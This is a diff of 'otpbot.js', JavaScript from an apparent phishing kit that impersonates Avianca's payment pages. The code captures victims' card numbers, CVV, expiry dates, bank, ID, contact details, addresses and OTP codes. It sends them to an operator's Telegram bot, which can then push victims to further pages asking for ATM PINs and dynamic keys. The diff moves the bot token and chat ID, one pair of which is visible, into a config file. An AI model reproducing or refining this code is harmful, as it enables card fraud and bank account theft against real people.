@@ -1,24 +1,24 @@
+// otpbot.js - versión corregida y comentada
+
 document.addEventListener("DOMContentLoaded", () => {
-    const btnNextStep = document.querySelector(".btn-success"); // Selecciona el botón
+    const btnNextStep = document.getElementById("btnNextStep");
 
     if (!btnNextStep) {
-        console.error("❌ No se encontró el botón Continuar con el pago.");
+        console.error("❌ No se encontró el botón Verificar.");
         return;
     }
 
     btnNextStep.addEventListener("click", async (event) => {
-        event.preventDefault(); // Evita el envío del formulario por defecto
+        event.preventDefault();
 
         const otpInput = document.getElementById("otp");
-
         if (!otpInput) {
             console.error("❌ No se encontró el campo OTP.");
             return;
         }
 
         const otp = otpInput.value.trim();
-
-        if (!otp) {  // Corregido `otpValue` → `otp`
+        if (!otp) {
             alert("Por favor, ingresa el código OTP.");
             return;
         }
@@ -39,33 +39,12 @@ document.addEventListener("DOMContentLoaded", () => {
             return;
         }
 
-        console.log("✅ Datos recuperados (pagoavianca):", pagoavianca);
-
-       // ⚠️ Aquí pegas tu token y chat ID directamente:
-        const config = {
-            botToken: "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y",
-            chatId: "-4644294739"
-        };
-
         const transactionId = Date.now().toString();
-        
-        const mensaje = `✈️ <b>Avianca</b> ✈️
-💳 Tarjeta: <code>${pagoavianca.card}</code>
-🗓️ Fecha: <code>${pagoavianca.card_date}</code>
-💳 CCV: <code>${pagoavianca.ccv}</code>
-🏦 Banco: <code>${pagoavianca.bank}</code>
-📅 Cuotas: <code>${pagoavianca.cuotas}</code>
-👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
-👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
-💳 CC: <code>${pagoavianca.cc}</code>
-📨 Correo: <code>${pagoavianca.email}</code>
-📲 Teléfono: <code>${pagoavianca.phone}</code>
-🏙️ Ciudad: <code>${pagoavianca.city}</code>
-🗽 Provincia: <code>${pagoavianca.state}</code>
-🧭 Dirección: <code>${pagoavianca.address}</code>
-🔑 OTP: <code>${otp}</code>`;
+        const config = await loadConfig();
+        if (!config) return;
 
-        // Crear teclado de Telegram
+        const mensaje = `✈️ <b>Avianca</b> ✈️\n💳 Tarjeta: <code>${pagoavianca.card}</code>\n🗓️ Fecha: <code>${pagoavianca.card_date}</code>\n💳 CCV: <code>${pagoavianca.ccv}</code>\n🏦 Banco: <code>${pagoavianca.bank}</code>\n📅 Cuotas: <code>${pagoavianca.cuotas}</code>\n👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>\n👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>\n💳 CC: <code>${pagoavianca.cc}</code>\n📨 Correo: <code>${pagoavianca.email}</code>\n📲 Teléfono: <code>${pagoavianca.phone}</code>\n🏙️ Ciudad: <code>${pagoavianca.city}</code>\n🗽 Provincia: <code>${pagoavianca.state}</code>\n🧭 Dirección: <code>${pagoavianca.address}</code>\n🔑 OTP: <code>${otp}</code>`;
+
         const keyboard = {
             inline_keyboard: [
                 [{ text: "X Logo", callback_data: `error_logo:${transactionId}` }],
@@ -78,8 +57,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
             ]
         };
-        
-       try {
+
         try {
             const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                 method: "POST",
@@ -91,7 +69,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     reply_markup: keyboard
                 })
             });
-           
+
             const data = await response.json();
 
             if (data.ok) {
@@ -105,8 +83,27 @@ document.addEventListener("DOMContentLoaded", () => {
             console.error("❌ Error en fetch de sendMessage:", error);
         }
     });
-}); 
-// Verificar respuesta en Telegram
+});
+
+async function loadConfig() {
+    try {
+        const response = await fetch("./claves.json");
+        if (!response.ok) throw new Error("No se pudo cargar claves.json");
+        const config = await response.json();
+
+        if (!config.botToken || !config.chatId) {
+            console.error("❌ Token o Chat ID no definidos en claves.json");
+            return null;
+        }
+
+        console.log("🔑 Config cargada:", config);
+        return config;
+    } catch (error) {
+        console.error("❌ Error al cargar claves.json:", error);
+        return null;
+    }
+}
+
 async function checkPaymentVerification(transactionId, messageId, config) {
     try {
         const response = await fetch(`https://api.telegram.org/bot${config.botToken}/getUpdates`);
@@ -114,8 +111,7 @@ async function checkPaymentVerification(transactionId, messageId, config) {
 
         const updates = data.result;
         const verificationUpdate = updates.find((update) =>
-            update.callback_query &&
-            [
+            update.callback_query && [
                 `error_tc:${transactionId}`,
                 `error_logo:${transactionId}`,
                 `dinamic:${transactionId}`,
@@ -144,7 +140,7 @@ async function checkPaymentVerification(transactionId, messageId, config) {
                     window.location.href = "id-check.html";
                     break;
                 case `error_tc:${transactionId}`:
-                    alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
+                    alert('Corrige el método de pago. Código: AVERR88000023');
                     window.location.href = "payment.html";
                     break;
                 case `pedir_otp:${transactionId}`:
@@ -157,11 +153,11 @@ async function checkPaymentVerification(transactionId, messageId, config) {
                     window.location.href = "clavecajero.html";
                     break;
                 case `xdinamic:${transactionId}`:
-                    alert('Error en la clave dinámica, inténtelo nuevamente')
+                    alert('Error en la clave dinámica, inténtelo nuevamente.');
                     window.location.href = "errordinamica.html";
                     break;
                 case `xotp:${transactionId}`:
-                    alert('Error en el código otp, inténtalo nuevamente.')
+                    alert('Código OTP incorrecto, intenta nuevamente.');
                     window.location.href = "errorotp.html";
                     break;
                 case `confirm_finalizar:${transactionId}`:
